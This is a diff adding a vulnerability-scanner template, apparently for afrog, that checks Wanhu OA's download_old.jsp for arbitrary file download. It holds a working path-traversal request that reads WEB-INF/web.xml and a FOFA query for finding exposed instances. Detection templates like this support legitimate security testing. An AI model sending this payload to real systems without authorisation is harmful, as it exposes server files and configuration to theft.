@@ -1,0 +1,19 @@
+id: wanhu-oa-download-fileread-old
+
+info:
+  name: 万户OA download_old.jsp 任意文件下载漏洞
+  author: zan8in
+  severity: high
+  description: |
+    万户OA download_old.jsp文件存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件
+    fofa: app="万户网络-ezOFFICE"
+  tags: wanhu,download,old,fileread
+  created: 2025/03/13
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml
+    expression: response.status == 200 && response.body.bcontains(b'<web-app') && response.body.bcontains(b'</web-app>')
+expression: r0()
